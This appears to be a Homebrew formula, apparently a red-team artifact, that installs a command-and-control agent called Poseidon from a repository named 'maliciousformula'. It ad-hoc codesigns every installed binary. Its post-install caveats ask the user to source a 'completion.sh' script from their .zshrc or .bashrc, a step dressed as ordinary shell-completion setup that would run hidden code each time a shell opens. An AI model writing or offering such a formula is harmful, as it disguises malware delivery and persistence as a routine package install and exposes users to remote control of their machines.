class Poseidon < Formula
    desc "Command and Control"
    homepage "https://github.com/werdhaihai/"
    url "https://github.com/werdhaihai/maliciousformula/releases/download/v1.33.7/poseidon-1.33.7.tar.gz"
    sha256 "2f05bc2d20908c6d3d4cbe13c98e7cd87e07afc474d68dee5f58b2c872d71bad"
    version "1.33.7"

    def install
        bin.install Dir["*"]
        Dir["#{bin}/*"].each do |f|
        system "codesign", "--force", "--sign", "-", f if File.file?(f)
        end
      end

    def caveats
        <<~EOS
        To finish installation, add the following line to .zshrc or .bashrc  
  source #{bin}/completion.sh
Then reopen your terminal app
        EOS
    end
    end
